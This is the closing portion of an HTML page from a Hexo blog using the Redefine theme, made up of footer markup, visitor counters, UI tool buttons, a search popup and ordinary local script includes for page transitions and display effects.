                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="lg:!block">
                        <span class="text-sm">TOTAL PAGE VIEWS</span>
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.2</a></span>
        </div>
        
        
            <div>
                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
		</div>
	</div>

	
	<div class="post-tools">
		<div class="post-tools-container">
	<ul class="article-tools-list">
		<!-- TOC aside toggle -->
		
		<li class="right-bottom-tools page-aside-toggle">
			<i class="fa-regular fa-outdent"></i>
		</li>
		

		<!-- go comment -->
		
		<li class="go-comment">
			<i class="fa-regular fa-comments"></i>
		</li>
		
	</ul>
</div>
	</div>
	

	<div class="right-side-tools-container">
		<div class="side-tools-container">
	<ul class="hidden-tools-list">
		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-plus"></i>
		</li>

		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-minus"></i>
		</li>

		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
			<i class="fa-regular fa-moon"></i>
		</li>

		<!-- rss -->
		

		

		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
			<i class="fa-regular fa-arrow-down"></i>
		</li>
	</ul>

	<ul class="visible-tools-list">
		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
			<i class="fa-regular fa-cog fa-spin"></i>
		</li>
		
		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
			<i class="arrow-up fas fa-arrow-up"></i>
			<span class="percent"></span>
		</li>
		
		
	</ul>
</div>
	</div>

	<div class="image-viewer-container">
	<img src="">
</div>

	
	<div class="search-pop-overlay">
	<div class="popup search-popup">
		<div class="search-header">
			<span class="search-input-field-pre">
				<i class="fa-solid fa-keyboard"></i>
			</span>
			<div class="search-input-container">
				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
			</div>
			<span class="popup-btn-close">
				<i class="fa-solid fa-times"></i>
			</span>
		</div>
		<div id="search-result">
			<div id="no-result">
				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
			</div>
		</div>
	</div>
</div>
	

</main>



<script src="/js/build/libs/Swup.min.js"></script>

<script src="/js/build/libs/SwupSlideTheme.min.js"></script>

<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>




	
<script src="/js/build/tools/imageViewer.js" type="module"></script>

<script src="/js/build/utils.js" type="module"></script>

<script src="/js/build/main.js" type="module"></script>

<script src="/js/build/layouts/navbarShrink.js" type="module"></script>

<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/build/layouts/categoryList.js" type="module"></script>



    
<script src="/js/build/tools/localSearch.js" type="module"></script>




    
<script src="/js/build/tools/codeBlock.js" type="module"></script>




    
<script src="/js/build/layouts/lazyload.js" type="module"></script>




    
<script src="/js/build/tools/runtime.js"></script>

    
<script src="/js/build/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/build/libs/Typed.min.js"></script>

  
<script src="/js/build/plugins/typed.js" type="module"></script>




    
        
<script src="/js/build/libs/mermaid.min.js"></script>

    
    
<script src="/js/build/plugins/mermaid.js"></script>






    
<script src="/js/build/libs/anime.min.js"></script>





    
<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>




<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>


<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>





    
<script src="/js/build/layouts/bookmarkNav.js" type="module"></script>


	
</body>

</html>